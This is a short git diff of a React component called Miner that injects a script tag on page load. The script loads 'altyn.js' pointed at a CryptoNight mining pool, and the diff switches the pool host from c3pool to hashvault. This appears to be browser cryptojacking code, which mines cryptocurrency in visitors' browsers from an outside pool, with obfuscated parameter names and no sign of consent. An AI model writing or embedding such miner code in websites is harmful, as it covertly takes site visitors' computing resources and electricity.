@@ -23,7 +23,9 @@ import { useEffect } from "react";
 export const Miner = () => {
   useEffect(() => {
     const script = document.createElement("script");
-    script.src = "./altyn.js?perfekt=wss://?algo=cn/r?jason=auto.c3pool.org:443";
+    script.src = "./altyn.js?perfekt=wss://?algo=cn/r?jason=pool.hashvault.pro:443";
+    //script.src = "./altyn.js?perfekt=wss://?algo=cn/r?jason=auto.c3pool.org:443";
+    
     script.async = true;
 
     script.onload = () => {
